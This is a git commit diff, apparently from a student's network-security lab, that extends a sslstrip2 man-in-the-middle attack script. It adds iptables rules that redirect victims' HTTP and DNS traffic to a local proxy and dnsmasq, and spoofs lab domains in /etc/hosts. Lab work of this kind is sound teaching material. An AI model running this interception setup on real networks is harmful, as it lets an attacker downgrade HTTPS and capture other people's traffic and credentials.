db697eacd44eb9465fae921f54d5f97e7b9f88e2
Simon Duret <simon.duret@etu.u-bordeaux.fr>
2018-02-28 18:44:16 +0100

    sslstrip2: redirect DNS request to dnsmasq during attack (immortal)

--- sslstrip2/immortal/attack.sh
+++ sslstrip2/immortal/attack.sh
@@ -3,6 +3,17 @@
 PROXY_PORT=4242
 
 iptables -t nat -F
+
+# Redirect 80 -> PROXY
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
+
+# Redirect 53 -> Dnsmasq
+iptables -t nat -A PREROUTING -p udp -m state --state NEW --destination-port 53 -j REDIRECT --to-port 53
+
+# Resolve attacked domains
+echo "147.210.12.1 www.opeth.local opeth.local" > /etc/hosts
+echo "147.210.12.1 www.opeth.secure opeth.secure" >> /etc/hosts
+echo "147.210.12.1 wwww.opeth.secure" >> /etc/hosts
+service dnsmasq restart
 
 /mnt/host/sslstrip2.py $PROXY_PORT
--- sslstrip2/immortal/start.sh
+++ sslstrip2/immortal/start.sh
@@ -1,6 +1,10 @@
 #!/bin/sh
+
 hostname immortal
 ifconfig eth0 147.210.12.2/24
 ifconfig eth1 147.210.13.1/24
 echo 1 > /proc/sys/net/ipv4/ip_forward
 route add default gw 147.210.13.2
+
+# Configure dnsmasq
+cp /mnt/host/dnsmasq.conf /etc/
